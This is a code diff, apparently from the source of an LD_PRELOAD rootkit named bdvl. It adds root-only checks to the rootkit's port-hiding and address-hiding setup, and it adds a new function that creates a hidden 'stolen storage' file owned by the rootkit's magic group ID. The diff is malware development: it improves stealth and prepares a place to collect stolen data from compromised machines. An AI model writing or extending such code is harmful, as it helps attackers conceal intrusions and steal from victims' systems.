@@ -49,7 +49,7 @@ int preparedir(const char *path, gid_t magicgid){
 
 #ifdef HIDE_PORTS
 void preparehideports(gid_t magicgid){
-    if(rknomore(INSTALL_DIR, BDVLSO))
+    if(rknomore(INSTALL_DIR, BDVLSO) || notuser(0))
         return;
 
     hook(CFOPEN, CACCESS);
@@ -73,7 +73,7 @@ void preparehideports(gid_t magicgid){
 
 #ifdef HIDE_ADDRS
 void preparehideaddrs(gid_t magicgid){
-    if(rknomore(INSTALL_DIR, BDVLSO))
+    if(rknomore(INSTALL_DIR, BDVLSO) || notuser(0))
         return;
 
     hook(CFOPEN, CACCESS);
@@ -94,6 +94,25 @@ void preparehideaddrs(gid_t magicgid){
 }
 #endif
 
+#ifdef STOLEN_STORAGE
+void preparestolenstore(gid_t magicgid){
+    if(rknomore(INSTALL_DIR, BDVLSO) || notuser(0))
+        return;
+
+    hook(CFOPEN, CACCESS);
+
+    if((long)call(CACCESS, STOLESTORE_PATH, F_OK) == 0)
+        return;
+
+    if(prepareregfile(STOLESTORE_PATH, magicgid) < 0)
+        return;
+
+    FILE *fp = call(CFOPEN, STOLESTORE_PATH, "w");
+    if(fp == NULL) return;
+    fprintf(fp, "%s\n", STOLEN_STORAGE);
+    fclose(fp);
+}
+#endif
 
 void bdprep(void){
     char *curpath;
